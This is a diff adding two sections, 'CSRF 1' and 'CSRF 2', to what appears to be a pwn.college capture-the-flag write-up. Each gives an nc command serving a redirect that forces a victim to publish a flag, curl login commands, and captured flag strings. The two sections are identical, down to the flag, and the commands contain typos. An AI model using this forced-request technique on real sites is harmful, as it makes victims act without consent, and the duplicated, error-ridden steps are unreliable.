@@ -315,3 +315,41 @@ curl -b cookies.txt "http://challenge.localhost:80"
 ```
 
 pwn.college{U0-aNStAuHMrzlr55C57ZbTebYA.dJDO1YDL5ETN1QzW}
+
+
+## CSRF 1
+
+Setting up a redirect using nc:
+
+```bash
+printf 'HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost/publish\r\n\r\n' | nc -l -p 8080
+
+```
+
+When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:
+
+```bash
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guast&password=password}"
+curl -b cookies.txt "http://challenge.localhost:80"
+```
+
+pwn.college{4ODFGRt6eAK9vbZHFQ6JkqcOGFS.ddTOzMDL5ETN1QzW}
+
+
+## CSRF 2
+
+Setting up a redirect using nc:
+
+```bash
+printf 'HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost/publish\r\n\r\n' | nc -l -p 8080
+
+```
+
+When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:
+
+```bash
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guast&password=password}"
+curl -b cookies.txt "http://challenge.localhost:80"
+```
+
+pwn.college{4ODFGRt6eAK9vbZHFQ6JkqcOGFS.ddTOzMDL5ETN1QzW}
